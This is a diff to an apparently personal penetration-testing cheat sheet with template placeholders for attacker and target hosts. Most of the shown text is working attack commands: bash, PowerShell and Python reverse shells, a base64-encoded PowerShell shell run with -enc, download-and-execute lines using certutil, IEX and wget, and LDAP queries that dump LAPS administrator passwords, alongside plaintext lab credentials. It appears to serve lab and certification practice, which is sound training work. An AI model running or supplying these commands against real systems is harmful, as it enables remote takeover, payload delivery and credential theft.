@@ -107,7 +107,8 @@ Get-ChildItem -Path C:\Users\ -Include *.ini,*.log,*.txt -File -Recurse -ErrorAc
 ## Reverse shell
 ```bash
 
-#reverse shell
+#bash reverse shell
+
 bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1
 bash -c 'bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1'
 #URLENCODED (bash -c 'bash -i >& /dev/tcp/<% tp.frontmatter["LHOST"] %>/<LPORT> 0>&1')
@@ -141,10 +142,15 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<% tp.fro
 
 powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<% tp.frontmatter["LHOST"] %>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 
+
+#Create powershell reverse shell on kali linux
+$ pwsh
 $Text = '$client = New-Object System.Net.Sockets.TCPClient("<% tp.frontmatter["LHOST"] %>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
 $EncodedText =[Convert]::ToBase64String($Bytes)
 $EncodedText
+$powershell -enc $EncodedText
+
 
 #python reverse shell
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<% tp.frontmatter["LHOST"] %>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -185,8 +191,8 @@ on windows
 
 ## File Sharing
 ```bash
-## File Sharing
 
+## certutil
 certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/reverse.exe
 certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Linux/linpeas.sh
 certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Windows/
@@ -195,23 +201,24 @@ certutil -urlcache -split -f http://<% tp.frontmatter["LHOST"] %>:8000/Windows/e
 
 c:/users/public/
 
-
+# smbserver
 impacket-smbserver test /home/rachit -smb2support -user joe -password joe
 net use m: \\<% tp.frontmatter["LHOST"] %>\test /user:joe joe /persistent:yes
 copy * \\<% tp.frontmatter["LHOST"] %>\test
 smbserver.py -smb2support test .
 
-
+# powershell
 iwr -uri <% tp.frontmatter["LHOST"] %>:8000/<FILE> -Outfile <FILE>
 IEX(IWR http://<% tp.frontmatter["LHOST"] %>/<FILE>) -UseBasicParsing
 powershell -command Invoke-WebRequest -Uri http://<% tp.frontmatter["LHOST"] %>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
 Invoke-Expression (Invoke-WebRequest http://<LHOST/<FILE>.ps1)
 
-
+# wget
 wget http://<% tp.frontmatter["LHOST"] %>/<FILE>
 wget -r --no-parent http://<% tp.frontmatter["LHOST"] %>/<FILE>
 wget -m http://<% tp.frontmatter["LHOST"] %>/<FILE>
 
+#c url
 curl http://<% tp.frontmatter["LHOST"] %>/<FILE> > <OUTPUT_FILE>
 
 #MSF
@@ -355,8 +362,6 @@ crackmapexec winrm <% tp.frontmatter["RHOST"] %>  -u "<% tp.frontmatter["USERNAM
 ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec'  -b 'DC=hutch,DC=offsec'
 ldapsearch -x -H 'ldap://192.168.216.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 
-
-
 ldapsearch -x -w <% tp.frontmatter["PASSWORD"] %>
 ldapsearch -x -H ldap://<% tp.frontmatter["RHOST"] %> -s base namingcontexts
 ldapsearch -x -b "dc=<% tp.frontmatter["DOMAIN"] %>,dc=offsec" "*" -H ldap://<% tp.frontmatter["RHOST"] %> | awk '/dn: / {print $2}'
@@ -370,6 +375,7 @@ ldapsearch -x -H ldap://dc.support.htb -D 'SUPPORT\ldap' -w 'nvEfEK16^1aM4$e7Acl
 ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb
 ```
 
+```bash
 # Get computers
 python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatter["USERNAME"] %>@domain.local -p <% tp.frontmatter["PASSWORD"] %> --computers
 # Get groups
@@ -380,7 +386,7 @@ python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatt
 python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatter["USERNAME"] %>@domain.local -p <% tp.frontmatter["PASSWORD"] %> --da
 # Get Privileged Users
 python3 windapsearch.py --dc-ip <% tp.frontmatter["RHOST"] %> -u <% tp.frontmatter["USERNAME"] %>@domain.local -p <% tp.frontmatter["PASSWORD"] %> --privileged-users
-
+```
 
 #powercat
 ```bash
